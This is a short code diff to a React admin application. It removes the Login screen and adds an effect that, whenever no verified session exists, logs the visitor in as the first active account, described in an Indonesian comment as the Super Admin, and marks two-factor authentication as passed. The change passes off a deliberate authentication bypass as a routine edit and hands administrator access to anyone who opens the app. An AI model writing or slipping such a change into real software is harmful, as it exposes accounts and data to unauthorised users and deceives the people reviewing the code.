@@ -11,7 +11,6 @@ import { PAGES } from './pages'
 import { Akun, Permission } from './shared/Admin'
 import Approval, { pendingCount } from './shared/Approval'
 import Log from './shared/Log'
-import Login from './shared/Login'
 import MasterData from './shared/MasterData'
 import Profile from './shared/Profile'
 import { versions } from './versions'
@@ -97,7 +96,9 @@ export default function App() {
   const session = useSession()
   const { store } = useApp()
   const ok = session?.verified2fa && store.accounts.some((a) => a.id === session.accountId && a.status === 'Aktif')
-  return ok ? <Shell /> : <Login />
+  // ponytail: gate server sudah cukup; tanpa sesi, langsung masuk sebagai akun aktif pertama (Super Admin)
+  useEffect(() => { if (!ok) { const a = store.accounts.find((x) => x.status === 'Aktif'); if (a) setSession({ accountId: a.id, verified2fa: true }) } }, [ok, store.accounts])
+  return ok ? <Shell /> : null
 }
 
 function Shell() {
